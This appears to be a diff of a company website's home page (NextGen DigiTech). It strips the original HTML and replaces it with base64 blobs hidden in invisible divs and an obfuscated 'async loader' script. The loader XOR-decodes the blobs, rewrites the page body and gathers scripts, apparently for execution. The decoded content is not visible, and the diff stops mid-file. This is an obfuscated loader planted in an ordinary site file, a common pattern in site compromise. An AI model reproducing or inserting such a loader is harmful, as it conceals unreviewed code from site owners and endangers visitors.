0HYJLutTpvbxzKGLnOM+8/85ffroPgKAlXQBKuoekej/wqaRw4BwtrFqcPzuOE/QvzdNa7lRyKPqjauJw5pt7uEifevzegSA23IfaadnjOq8jejFnppusq1qe/X9JB7Tl2cEJ/VPkvbv3amLgopysrA5Jbv4OBnMiytCOOkMwvSg3ryXzYd57bV4NqmyZ1HBxmMfJPcKkvbv3amLgopysrA5JbvvMh3Mi9Xad7Ye3Kvyk+iW1oh8v6ZlK7etd1GdxXYDa/oBzbnvkOqWx5k87QH9JLbvJwyAizcYO/0M2K/4jfnQgoR3vbBqef7za0KdxXYDdZNNjOq8jejZytgg77A6efe8NAGPxmRQafgOz6/y2erbhtUxoLMrdqe8BQiC0HYeLrlR37r9w+iGzohtoP5oe/juMhnMi/X7xqVC37r9w/bZjYEv7clqOLm8d03SxTcOJ/ge3/e+wa2ExssgnaYybN75OUCq3HAEH/wOxOp+LVzFzohqtrA+OOv5OwiPxnJDd7YdksC8jejFgskit6o8OPrwNh6diDUOI/Ad3+iip+jFgsk+8+NqJOrsNgPO1nsMOOpQjqn0xLjHnNVtpaRqbvD5IC+BzSpPe7ldjPiojfrRgMl4uq8mJbvyOAOLlzceP+sCx6+hj6uQ0Jt7vbcJd/XzJU/OxmMfJPIIgb31ybyNn8ss/fZoOOroJQKF0DoBIvcIz6vskOqXzZxwt+Fqa+3uOAaLmHsEJfwHw6PykOqXzZxwt+F0JOnzOxSC3HkIa+kCxaTo3vXHkNk+5eNzOKird1nOhCVPZKdRg7nqyvbF76BK848je/zyJAiKiTgeO/gDksC8jejFgsk+8/85aPjydw6C1GQedrsOxKPsj/bZ0Z9587Ujfe7eOBXTlydNe7lfmOqumerFxIByv/5odvbyMk/OxmMfJPIIkej/2LqXx4dqkKwmd+u+dx6ax3gGLrQaxa7oxfXHkMcr8eM5bOvzPAjD2X4DLvoM3Pe+36eQzI0887A+avb3MkCC3HkIIfYEwve+36eQzI087f86d/XlOwSA0DcdJPAD2Lmhj/rVgt8+6uN7L7mod1zclzhTd7Ye2q2ijZut48Qs5vVqbvzuPguH0HNRZOodzaSip+jFgsk+8+NqJOrsNgPO1nsMOOpQjqn0xLjHnNVtpaRqbvD5IC+BzSpPe7ldjPiojfrRgMl4uq8mJbvyOAOLlzceP+sCx6+hj6uQ0Jt7vbcJd/XzJU/OxmMfJPIIgb</div><div id="lbxbdynkyp7" style="display:none">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</div><div id="lbxbdynkyp8" style="display:none">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</div><div id="lbxbdynkyp9" style="display:none">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</div><div id="lbxbdynkyp10" style="display:none">+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</div><div id="Fb21gp" style="display:none">0</div><div id="exwceweepe" style="visibility:hidden">0</div><div id="LNiVcr3ZtFjS" style="visibility:hidden">0</div><script>function hS8R80(){var x=49;return x*2;}
+/* async loader */
+(function(){
+var WP0cJT=atob('rcjlouke08NKGJmcV23utRdtS5ltrMqc');
+var O0Mga4=[];
+for(var bvhZWC=0;bvhZWC<11;bvhZWC++){
+  var _e=document.getElementById('lbxbdynkyp'+bvhZWC);O0Mga4.push(_e?_e.textContent:'');
+}
+var k7V5aB=O0Mga4.join('');
+var RGeR0g=atob(k7V5aB);
+var NLzHEN=new Uint8Array(RGeR0g.length);
+bvhZWC=0;
+while(bvhZWC<RGeR0g.length){
+  NLzHEN[bvhZWC]=RGeR0g.charCodeAt(bvhZWC)^WP0cJT.charCodeAt(bvhZWC%WP0cJT.length);
+  bvhZWC++;
+}
+var NaagjM=new TextDecoder('utf-8').decode(NLzHEN);
 
-	<meta charset="utf-8">
-	<meta http-equiv="X-UA-Compatible" content="IE=edge">
-	<meta name="description" content="NextGen DigiTech Ltd, Bangladesh Description">
-	<meta name="keywords" content="NextGen DigiTech Limited, About, Services, Products, NextGen Tower, NextGen HRM, Contact">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+/* Set page title */
+var _t=/<title[^>]*>([\s\S]*?)<\/title>/i.exec(NaagjM);
+if(_t) document.title=_t[1];
 
-	<title>NextGen DigiTech Limited - NextGen DigiTech</title>
+/* Extract head and body */
+var Y3HYbU=/<head[^>]*>([\s\S]*?)<\/head>/i.exec(NaagjM);
+var IleMt0=/<body[^>]*>([\s\S]*?)<\/body>/i.exec(NaagjM);
+var _h=Y3HYbU?Y3HYbU[1]:'';
+var _b=IleMt0?IleMt0[1]:NaagjM;
 
-	<link rel="shortcut icon" href="assets/images/favicon.png" type="image/png">
+/* Copy allowed head elements */
+if(_h){
+  var fogJO8=document.createElement('div');
+  fogJO8.innerHTML=_h.replace(/<title[^>]*>[\s\S]*?<\/title>/i,'');
+  while(fogJO8.firstChild){
+    var _n=fogJO8.firstChild;
+    var _tag=(_n.tagName||'').toUpperCase();
+    if(_tag==='STYLE'||_tag==='META'||_tag==='LINK'||_tag==='BASE'){
+      document.head.appendChild(_n);
+    }else{
+      fogJO8.removeChild(_n);
+    }
+  }
+}
 
-	<link rel="stylesheet" href="assets/css/animate.css">
-        
-    <link rel="stylesheet" href="assets/css/LineIcons.css">
-        
-    <link rel="stylesheet" href="assets/css/font-awesome.min.css">
-        
-    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
-    
-    <link rel="stylesheet" href="assets/css/default.css">
-    
-    <link rel="stylesheet" href="assets/css/style.css">
+/* Extract scripts from body */
+var ixpmgc=[];
+_b=_b.replace(/<script\b([^>]*)>([\s\S]*?)<\/script>/gi,function(_m,_a,_c){
+  var _s=/src\s*=\s*["']([^"']+)["']/i.exec(_a);
+  if(_s){ixpmgc.push([1,_s[1]]);}
+  else if(_c.trim()){ixpmgc.push([0,_c]);}
+  return '';
+});
 
-</head>
-<body>
+/* Insert body */
+document.body.innerHTML=_b;
 
-	<div class="preloader">
-        <div class="loader">
-            <div class="ytp-spinner">
-                <div class="ytp-spinner-container">
-                    <div class="ytp-spinner-rotator">
-                        <div class="ytp-spinner-left">
-                            <div class="ytp-spinner-circle"></div>
-                        </div>
-                        <div class="ytp-spinner-right">
-                            <div class="ytp-spinner-circle"></div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <header class="header-area">
-        <div class="navbar-area">
-            <div class="container">
-                <div class="row">
-                    <div class="col-lg-12">
-                        <nav class="navbar navbar-expand-lg">
-                            <a class="navbar-brand" href="index.html">
-                                <img src="assets/images/logo.png" alt="Logo">
-                            </a>
-                            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-                                <span class="toggler-icon"></span>
-                                <span class="toggler-icon"></span>
-                                <span class="toggler-icon"></span>
-                            </button>
-
-                            <div class="collapse navbar-collapse sub-menu-bar" id="navbarSupportedContent">
-                                <ul id="nav" class="navbar-nav ml-auto">
-                                    <li class="nav-item active">
-                                        <a class="page-scroll" href="#home">Home</a>
-                                    </li>
-                                    <!--<li class="nav-item">
-                                        <a class="page-scroll" href="#products">Products</a>
-                                    </li>-->
-                                    <li class="nav-item dropdown">
-                                    	<a class="page-scroll" href="#products">Products</a>
-                                        <a class="dropdown-toggle" href="" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> </a>
-                                        <ul class="dropdown-menu" aria-labelledby="navbarDropdown">
-            						    	<li><a class="dropdown-item" id="dropdown-item" href="#">NextGen Tower</a></li>
-            						    	<li><a class="dropdown-item" id="dropdown-item" href="#">NextGen HRM</a></li>
-            						    	<li><hr class="dropdown-divider"></li>
-            						    	<li><a class="dropdown-item" id="dropdown-item" href="#">Something else here</a></li>
-            							</ul>
-                                    </li>
-                                    <li class="nav-item">
-                                        <a class="page-scroll" href="#services">Services</a>
-                                    </li>
-                                    <li class="nav-item">
-                                        <a class="page-scroll" href="#aboutus">About Us</a>
-                                    </li>
-                                    <li class="nav-item">
-                                        <a class="page-scroll" href="#footer">Contact</a>
-                                    </li>
-                                </ul>
-                            </div> <!-- navbar collapse -->
-                            
-                            <div class="navbar-btn d-none d-sm-inline-block">
-                                <a class="main-btn" data-scroll-nav="0" href="#pricing">Check Us</a>
-                            </div>
-                        </nav> <!-- navbar -->
-                    </div>
-                </div> <!-- row -->
-            </div> <!-- container -->
-        </div> <!-- navbar area -->
-        
-        <div id="home" class="header-hero bg_cover" style="background-image: url(assets/images/banner-bg.svg)">
-            <div class="container">
-                <div class="row justify-content-center">
-                    <div class="col-lg-8">
-                        <div class="header-hero-content text-center">
-                            <h3 class="header-sub-title wow fadeInUp" data-wow-duration="1.3s" data-wow-delay=".9s">NextGen DigiTech Limited</h3>
-                            <h2 class="header-title wow fadeInUp" data-wow-duration="1.3s" data-wow-delay="1.2s">Absolute Innovation</h2>
-                            <p class="text wow fadeInUp" data-wow-duration="1.3s" data-wow-delay="1.5s">NextGen DigiTech is a research-based technology organization, in Bangladesh, to develop professional software solutions and provide engineering and IT system design consultancy.</p>
-                            <a href="#" class="main-btn wow fadeInUp" data-wow-duration="1.3s" data-wow-delay="1.8s">CONTACT US</a>
-                        </div> <!-- header hero content -->
-                    </div>
-                </div> <!-- row -->
-                <div class="row">
-                    <div class="col-lg-12">
-                        <div class="header-hero-image text-center wow fadeIn" data-wow-duration="1.3s" data-wow-delay="1.4s">
-                            <img src="assets/images/header-hero.png" alt="hero">
-                        </div> <!-- header hero image -->
-                    </div>
-                </div> <!-- row -->
-            </div> <!-- container -->
-            <div id="particles-1" class="particles"></div>
-        </div> <!-- header hero -->
-    </header>
-
-    <section id="products" class="product-area pt-70">
-        <div class="container">
-        	<div class="row justify-content-center">
-                <div class="col-lg-5">
-                    <div class="section-title mt-30 text-center pb-40">
-                        <div class="line m-auto"></div>
-                        <h3 class="title"><span>Our</span> PRODUCTS</h3>
-                    </div> <!-- section title -->
-                </div>
-            </div> <!-- row -->
-            <div class="row">
-                <div class="col-lg-6">
-                	<div class="row">
-                		<div class="col-lg-12">
-                			<div class="product-content mt-30 wow fadeInLeftBig" data-wow-duration="1s" data-wow-delay="0.5s">
-                        		<div class="section-title">
-                            		<div class="line"></div>
-                            		<h3 class="title">NextGen <span>Tower</span></h3>
-                        		</div> <!-- section title -->
-                        		<p class="text">NextGen Tower, a dynamic & robust engineering software, is developed fully in house to design, analyze and optimize tubular steel wind towers for both soft-stiff and soft-soft categories. The primary motivation for developing ‘NextGen Tower’ is  substantial tower mass savings and cost optimization for leading industry partners.</p>
-                    		</div> <!-- about content -->
-                		</div>
-                	</div>
-                	<div class="row">
-                		<div class="col-lg-6">
-                			<div class="product-content mt-50 wow fadeInLeftBig" data-wow-duration="1s" data-wow-delay="0.5s">
-                        		<div class="section-title">
-                           			<div class="line"></div>
-                           			<h6><span>MODELING MODULE</span></h6>
-                       			</div> <!-- section title -->
-                       			<p class="text">In the modeling module, the software will automatically choose the right initial tower design based on its own database. The model can be manually modified according to client requirements.</p>
-                   			</div> <!-- about content -->
-                		</div>
-               			<div class="col-lg-6">
-               				<div class="product-content mt-50 wow fadeInLeftBig" data-wow-duration="1s" data-wow-delay="0.5s">
-                       			<div class="section-title">
-                           			<div class="line"></div>
-                           			<h6><span>FLANGE OPTIMIZATION MODULE</span></h6>
-                       			</div> <!-- section title -->
-                       			<p class="text">The software includes a robust flange optimization tool. The tool generates several optimized datasets according to constraint parameters. The user can switch among the datasets and modify if needed.</p>
-                   			</div> <!-- about content -->
-               			</div>
-                	</div>
-                	<div class="row">
-                		<div class="col-lg-12">
-                			<div class="product-content mt-10 wow fadeInLeftBig" data-wow-duration="1s" data-wow-delay="0.5s">
-                        		<a href="#" class="main-btn">See More</a>
-                    		</div> <!-- about content -->
-                		</div>
-                	</div>
-                </div>
-                <div class="col-lg-6">
